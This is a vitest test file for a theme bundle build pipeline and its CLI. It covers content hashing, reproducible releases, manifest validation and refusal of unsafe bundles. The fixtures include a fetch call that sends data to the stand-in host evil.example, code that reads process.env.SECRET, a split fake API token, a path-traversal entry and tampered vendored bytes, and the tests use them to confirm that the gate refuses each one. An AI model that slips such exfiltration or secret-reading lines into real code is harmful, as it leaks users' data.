import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import {
  assembleDevThemeBundle,
  hashedOutputPath,
  type AssembleInput,
} from "./dev-theme-bundle-assemble";
import {
  DEV_THEME_BUNDLE_LIMITS,
  fingerprintDevThemeRelease,
  hashBytes,
  type DevThemeBundleFile,
} from "./dev-theme-bundle";
import { DEV_THEME_RUNTIME_VERSION } from "./dev-theme-manifest";

/**
 * Level B bundle build pipeline — TDD vectors.
 *
 * The pipeline (`src/lib/dev-theme-bundle-assemble.ts` + the thin
 * `scripts/build-dev-theme.mjs` CLI) parses + validates the manifest fail
 * closed, validates bundle files through the reused gates, copies assets to
 * content-hashed names, and emits `release.json` as the exact shape
 * `fingerprintDevThemeRelease` hashes. Every fixture theme here lives under
 * the OS temp dir (never in-repo); the only in-repo reads are the
 * `examples/demo-theme/` sources mapped exactly like
 * `commerce-bridge.test.ts` maps its fixture bundle.
 */

const testDir = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(testDir, "..", "..");
const SCRIPT = join(REPO_ROOT, "scripts", "build-dev-theme.mjs");
const DEMO_DIR = join(REPO_ROOT, "examples", "demo-theme");

const GSAP_DEP = {
  name: "gsap",
  version: "3.15.0",
  license: "MIT",
  integrity: "sha384-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
};

function demoManifest(over: Record<string, unknown> = {}) {
  return {
    id: "aurora-lookbook",
    version: "1.0.0",
    runtime: DEV_THEME_RUNTIME_VERSION,
    name: "Aurora Lookbook",
    publisher: "Studio Framique",
    capabilities: ["presentation", "animation"],
    dependencies: [{ ...GSAP_DEP }],
    sections: [{ key: "hero", slot: "main", component: "HeroCanvas" }],
    settings: [{ key: "headline", label: "Headline", type: "text" }],
    ...over,
  };
}

function bundleFile(
  path: string,
  text: string,
  extra: Partial<DevThemeBundleFile> = {},
): DevThemeBundleFile {
  return { path, bytes: new TextEncoder().encode(text), ...extra };
}

function validFiles(manifestText?: string): DevThemeBundleFile[] {
  return [
    bundleFile(
      "dev.theme.json",
      manifestText ?? JSON.stringify(demoManifest()),
    ),
    bundleFile(
      "components/Hero.js",
      `export function HeroCanvas() { return "hero"; }`,
    ),
    bundleFile("styles/main.css", `.hero { color: red; }`),
    bundleFile("assets/logo.png", "fake-png-bytes"),
    bundleFile("locales/en.json", JSON.stringify({ headline: "Hello" })),
  ];
}

function validInput(over: Partial<AssembleInput> = {}): AssembleInput {
  return { manifestJson: demoManifest(), files: validFiles(), ...over };
}

function realIntegrity(
  algo: "sha256" | "sha384" | "sha512",
  bytes: Uint8Array,
): string {
  return `${algo}-${createHash(algo).update(bytes).digest("base64")}`;
}

function writeTmpTheme(entries: DevThemeBundleFile[]): string {
  const dir = mkdtempSync(join(tmpdir(), "dev-theme-src-"));
  for (const entry of entries) {
    if (entry.symlink === true) continue;
    const abs = join(dir, entry.path);
    mkdirSync(dirname(abs), { recursive: true });
    writeFileSync(abs, entry.bytes);
  }
  return dir;
}

function writeManifest(dir: string, manifestObj: unknown): void {
  writeFileSync(join(dir, "dev.theme.json"), JSON.stringify(manifestObj));
}

function runCli(argv: string[]) {
  return spawnSync("node", [SCRIPT, ...argv], {
    cwd: REPO_ROOT,
    encoding: "utf8",
    timeout: 60_000,
  });
}

describe("assembleDevThemeBundle — valid builds", () => {
  it("accepts a valid theme with hashed, sorted files + hex fingerprint", () => {
    const verdict = assembleDevThemeBundle(validInput());
    expect(verdict.ok).toBe(true);
    if (!verdict.ok) return;
    expect(verdict.fingerprint).toMatch(/^[0-9a-f]{64}$/);
    const paths = verdict.files.map((f) => f.path);
    expect([...paths].sort()).toEqual(paths);
    for (const f of verdict.files) {
      expect(f.sha256).toMatch(/^[0-9a-f]{64}$/);
    }
  });

  it("emits release.json as the exact shape the fingerprint hashes", () => {
    const verdict = assembleDevThemeBundle(validInput());
    expect(verdict.ok).toBe(true);
    if (!verdict.ok) return;
    const shipped = JSON.parse(verdict.releaseJson) as {
      manifest: unknown;
      files: { path: string; sha256: string; bytes: number }[];
      fingerprint: string;
    };
    expect(Object.keys(shipped).sort()).toEqual([
      "files",
      "fingerprint",
      "manifest",
    ]);
    expect(shipped.fingerprint).toBe(verdict.fingerprint);
    expect(
      fingerprintDevThemeRelease(
        shipped.manifest as never,
        shipped.files as never,
      ),
    ).toBe(verdict.fingerprint);
  });

  it("hashes area files as name.<sha8>.<ext> from content bytes", () => {
    const bytes = new TextEncoder().encode(`export const x = 1;`);
    const sha8 = hashBytes(bytes).slice(0, 8);
    expect(hashedOutputPath("components/widget.js", bytes)).toBe(
      `components/widget.${sha8}.js`,
    );
    expect(hashedOutputPath("styles/main.css", bytes)).toBe(
      `styles/main.${sha8}.css`,
    );
    expect(hashedOutputPath("dev.theme.json", bytes)).toBe("dev.theme.json");
    expect(hashedOutputPath("readme.md", bytes)).toBe("readme.md");
  });

  it("copies dev.theme.json verbatim and hashes area files", () => {
    const files = validFiles();
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(true);
    if (!verdict.ok) return;
    const byPath = new Map(verdict.outputs.map((o) => [o.path, o.bytes]));
    const manifestBytes = files.find((f) => f.path === "dev.theme.json")?.bytes;
    expect(byPath.get("dev.theme.json")).toEqual(manifestBytes);
    const hero = verdict.files.find((f) =>
      f.path.startsWith("components/Hero."),
    );
    expect(hero?.path).toMatch(/^components\/Hero\.[0-9a-f]{8}\.js$/);
    const heroOut = verdict.outputs.find((o) => o.path === hero?.path);
    const heroIn = files.find((f) => f.path === "components/Hero.js")?.bytes;
    expect(heroOut?.bytes).toEqual(heroIn);
  });

  it("is byte-stable: two assembles yield identical releaseJson + fingerprint", () => {
    const a = assembleDevThemeBundle(validInput());
    const b = assembleDevThemeBundle(validInput());
    expect(a.ok && b.ok).toBe(true);
    if (!a.ok || !b.ok) return;
    expect(b.releaseJson).toBe(a.releaseJson);
    expect(b.fingerprint).toBe(a.fingerprint);
  });
});

describe("assembleDevThemeBundle — demo-theme mapping", () => {
  function demoBundleInput() {
    const manifestJson = JSON.parse(
      readFileSync(join(DEMO_DIR, "dev.theme.json"), "utf8"),
    ) as Record<string, unknown>;
    const text = (name: string) => readFileSync(join(DEMO_DIR, name), "utf8");
    const enc = new TextEncoder();
    const bytes = (name: string) => enc.encode(text(name));
    const raw = (name: string) =>
      new Uint8Array(readFileSync(join(DEMO_DIR, name)));
    return {
      manifest: manifestJson,
      files: [
        { path: "dev.theme.json", bytes: raw("dev.theme.json") },
        { path: "sections/story-block.js", bytes: bytes("story-block.ts") },
        {
          path: "sections/media-carousel.js",
          bytes: bytes("media-carousel.ts"),
        },
        { path: "sections/product-cards.js", bytes: bytes("product-cards.ts") },
        { path: "sections/webgl-scene.js", bytes: bytes("webgl-scene.ts") },
        { path: "components/commerce.js", bytes: bytes("commerce.ts") },
        { path: "components/shared.js", bytes: bytes("shared.ts") },
      ] as DevThemeBundleFile[],
    };
  }

  it("builds the mapped demo fixture with a stable fingerprint", () => {
    const { manifest, files } = demoBundleInput();
    const first = assembleDevThemeBundle({ manifestJson: manifest, files });
    expect(first.ok).toBe(true);
    if (!first.ok) return;
    expect(first.files).toHaveLength(7);
    const second = assembleDevThemeBundle({ manifestJson: manifest, files });
    expect(second.ok).toBe(true);
    if (!second.ok) return;
    expect(second.fingerprint).toBe(first.fingerprint);
    expect(second.releaseJson).toBe(first.releaseJson);
  });

  it("preserves the demo capabilities and sections", () => {
    const { manifest, files } = demoBundleInput();
    const verdict = assembleDevThemeBundle({ manifestJson: manifest, files });
    expect(verdict.ok).toBe(true);
    if (!verdict.ok) return;
    expect(verdict.manifest.capabilities).toEqual(
      expect.arrayContaining(["presentation", "commerce-read", "cart-write"]),
    );
    expect(verdict.manifest.sections.map((s) => s.key)).toEqual([
      "story-arc",
      "media-carousel",
      "curated-cards",
      "webgl-scene",
    ]);
  });
});

describe("assembleDevThemeBundle — manifest refusals", () => {
  it("refuses an unknown capability", () => {
    const verdict = assembleDevThemeBundle(
      validInput({
        manifestJson: demoManifest({
          capabilities: ["presentation", "camera"],
        }),
      }),
    );
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/capabilit/);
  });

  it("refuses a non-exact runtime pin", () => {
    const verdict = assembleDevThemeBundle(
      validInput({ manifestJson: demoManifest({ runtime: "^1.0.0" }) }),
    );
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/runtime/);
  });

  it("refuses a forbidden top-level key", () => {
    const verdict = assembleDevThemeBundle(
      validInput({ manifestJson: demoManifest({ server: { entry: "x" } }) }),
    );
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/forbidden/);
  });

  it("refuses a weak-hash integrity shape", () => {
    const bad = demoManifest({
      dependencies: [
        {
          name: "gsap",
          version: "3.15.0",
          license: "MIT",
          integrity: "md5-dGVzdA==",
        },
      ],
    });
    const verdict = assembleDevThemeBundle({
      manifestJson: bad,
      files: validFiles(JSON.stringify(bad)),
    });
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/integrity/);
  });

  it("refuses a non-object manifest", () => {
    const verdict = assembleDevThemeBundle(validInput({ manifestJson: null }));
    expect(verdict.ok).toBe(false);
  });
});

describe("assembleDevThemeBundle — bundle refusals", () => {
  it("refuses server code in shipped JS", () => {
    const files = validFiles();
    files.push(
      bundleFile("components/evil.js", `export const k = process.env.SECRET;`),
    );
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/server_code/);
  });

  it("refuses secrets files", () => {
    const files = validFiles();
    files.push(bundleFile("components/.env", "x"));
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/secrets_file/);
  });

  it("refuses embedded credentials (Tier-0)", () => {
    // Split literal so this repo's own secret scanner never sees a joined
    // token in the fixture source (same pattern as dev-theme-bundle.test.ts).
    const token = "sk-" + "abcdefghijklmnopqrstuvwxyz0123456789";
    const files = validFiles();
    files.push(
      bundleFile("components/evil.js", `export const key = "${token}";`),
    );
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/secret/);
  });

  it("refuses non-allowlisted network hosts, allows listed ones", () => {
    const files = validFiles();
    files.push(
      bundleFile(
        "components/evil.js",
        `fetch("https://evil.example/collect"); export const x = 1;`,
      ),
    );
    const refused = assembleDevThemeBundle(validInput({ files }));
    expect(refused.ok).toBe(false);
    if (!refused.ok) {
      expect(refused.errors.join(" ")).toMatch(/network_host/);
    }
    const allowed = assembleDevThemeBundle(
      validInput({ files, allowedNetworkHosts: ["evil.example"] }),
    );
    expect(allowed.ok).toBe(true);
  });

  it("refuses path-traversal entries", () => {
    const files = validFiles();
    files.push(bundleFile("../evil.js", "x"));
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/unsafe_path/);
  });

  it("refuses symlink entries", () => {
    const files = validFiles();
    files.push(bundleFile("components/link.js", "x", { symlink: true }));
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/symlink/);
  });

  it("refuses oversize entries", () => {
    const files = validFiles();
    files.push({
      path: "assets/big.png",
      bytes: new Uint8Array(DEV_THEME_BUNDLE_LIMITS.maxEntryBytes + 1),
    });
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/entry_too_large/);
  });

  it("refuses duplicate paths", () => {
    const files = validFiles();
    files.push(bundleFile("components/Hero.js", "other"));
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/duplicate/);
  });

  it("refuses root extras the gate cannot carry (readme.md)", () => {
    // The bundle gate's extension allowlist runs before its root-extras
    // rule, so readme/license extras are refused with blocked_extension
    // today. The assembler forwards the refusal verbatim.
    const files = validFiles();
    files.push(bundleFile("readme.md", "# Aurora"));
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/blocked_extension/);
  });

  it("refuses blocked executable extensions", () => {
    const files = validFiles();
    files.push(bundleFile("components/server.ts", "payload"));
    const verdict = assembleDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/blocked_extension/);
  });
});

describe("assembleDevThemeBundle — vendor stage", () => {
  it("accepts vendored bytes matching the pin digest", () => {
    const vendorBytes = new TextEncoder().encode("vendored-engine-bytes");
    const dep = {
      name: "gsap",
      version: "3.15.0",
      license: "MIT",
      integrity: realIntegrity("sha384", vendorBytes),
    };
    const manifestObj = demoManifest({ dependencies: [dep] });
    const verdict = assembleDevThemeBundle({
      manifestJson: manifestObj,
      files: validFiles(JSON.stringify(manifestObj)),
      vendorFiles: [{ path: "gsap-3.15.0.js", bytes: vendorBytes }],
    });
    expect(verdict.ok).toBe(true);
  });

  it("refuses tampered vendored bytes", () => {
    const vendorBytes = new TextEncoder().encode("vendored-engine-bytes");
    const dep = {
      name: "gsap",
      version: "3.15.0",
      license: "MIT",
      integrity: realIntegrity("sha384", vendorBytes),
    };
    const manifestObj = demoManifest({ dependencies: [dep] });
    const verdict = assembleDevThemeBundle({
      manifestJson: manifestObj,
      files: validFiles(JSON.stringify(manifestObj)),
      vendorFiles: [
        { path: "gsap-3.15.0.js", bytes: new TextEncoder().encode("tampered") },
      ],
    });
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/vendor_mismatch/);
  });

  it("fails closed on an empty vendor dir, skips the check when omitted", () => {
    const skipped = assembleDevThemeBundle(validInput());
    expect(skipped.ok).toBe(true);
    const missing = assembleDevThemeBundle(validInput({ vendorFiles: [] }));
    expect(missing.ok).toBe(false);
    if (!missing.ok) {
      expect(missing.errors.join(" ")).toMatch(/vendor_missing/);
    }
  });
});

describe("build-dev-theme.mjs — CLI", () => {
  it("builds a tmp theme: exit 0, release.json + hashed files on disk", () => {
    const src = writeTmpTheme(validFiles());
    const out = join(mkdtempSync(join(tmpdir(), "dev-theme-out-")), "build");
    const run = runCli(["--src", src, "--out", out]);
    expect(run.status).toBe(0);
    expect(run.stdout).toMatch(/ok fingerprint=[0-9a-f]{64}/);
    const shipped = JSON.parse(
      readFileSync(join(out, "release.json"), "utf8"),
    ) as {
      manifest: never;
      files: never;
      fingerprint: string;
    };
    const direct = assembleDevThemeBundle({
      manifestJson: demoManifest(),
      files: validFiles(),
    });
    expect(direct.ok).toBe(true);
    if (!direct.ok) return;
    expect(shipped.fingerprint).toBe(direct.fingerprint);
    const hero = shipped.files as { path: string }[];
    const heroPath = hero.find((f) =>
      f.path.startsWith("components/Hero."),
    )?.path;
    expect(heroPath).toMatch(/^components\/Hero\.[0-9a-f]{8}\.js$/);
    expect(existsSync(join(out, heroPath as string))).toBe(true);
    expect(existsSync(join(out, "dev.theme.json"))).toBe(true);
  });

  it("is byte-stable: two CLI builds yield identical release.json", () => {
    const src = writeTmpTheme(validFiles());
    const base = mkdtempSync(join(tmpdir(), "dev-theme-det-"));
    const outA = join(base, "a");
    const outB = join(base, "b");
    expect(runCli(["--src", src, "--out", outA]).status).toBe(0);
    expect(runCli(["--src", src, "--out", outB]).status).toBe(0);
    expect(readFileSync(join(outA, "release.json"))).toEqual(
      readFileSync(join(outB, "release.json")),
    );
  });

  it("fails closed on an unknown capability without writing", () => {
    const src = mkdtempSync(join(tmpdir(), "dev-theme-bad-"));
    for (const entry of validFiles()) {
      const abs = join(src, entry.path);
      mkdirSync(dirname(abs), { recursive: true });
      writeFileSync(abs, entry.bytes);
    }
    writeManifest(
      src,
      demoManifest({ capabilities: ["presentation", "camera"] }),
    );
    const out = join(src, "..", `dev-theme-bad-out-${Date.now()}`);
    const run = runCli(["--src", src, "--out", out]);
    expect(run.status).toBe(1);
    expect(run.stderr).toMatch(/capabilit/);
    expect(existsSync(out)).toBe(false);
  });

  it("refuses on-disk symlinks without writing", () => {
    const src = writeTmpTheme(validFiles());
    const target = join(src, "components", "Hero.js");
    symlinkSync(target, join(src, "components", "link.js"));
    const out = join(mkdtempSync(join(tmpdir(), "dev-theme-sym-")), "build");
    const run = runCli(["--src", src, "--out", out]);
    expect(run.status).toBe(1);
    expect(run.stderr).toMatch(/symlink/);
    expect(existsSync(out)).toBe(false);
  });

  it("verifies --vendor-dir pins against pre-vendored bytes, never fetching", () => {
    const vendorBytes = new TextEncoder().encode("vendored-engine-bytes");
    const dep = {
      name: "gsap",
      version: "3.15.0",
      license: "MIT",
      integrity: realIntegrity("sha384", vendorBytes),
    };
    const manifestObj = demoManifest({ dependencies: [dep] });
    const src = writeTmpTheme(validFiles(JSON.stringify(manifestObj)));
    const vendorDir = mkdtempSync(join(tmpdir(), "dev-theme-vendor-"));
    writeFileSync(join(vendorDir, "gsap-3.15.0.js"), vendorBytes);
    const base = mkdtempSync(join(tmpdir(), "dev-theme-vout-"));
    expect(
      runCli([
        "--src",
        src,
        "--out",
        join(base, "a"),
        "--vendor-dir",
        vendorDir,
      ]).status,
    ).toBe(0);
    writeFileSync(join(vendorDir, "gsap-3.15.0.js"), "tampered-bytes");
    const tampered = runCli([
      "--src",
      src,
      "--out",
      join(base, "b"),
      "--vendor-dir",
      vendorDir,
    ]);
    expect(tampered.status).toBe(1);
    expect(tampered.stderr).toMatch(/vendor_mismatch/);
  });

  it("exits 2 on usage errors", () => {
    const run = runCli(["--out", join(tmpdir(), "dev-theme-nope")]);
    expect(run.status).toBe(2);
    expect(run.stderr).toMatch(/usage/);
  });
});
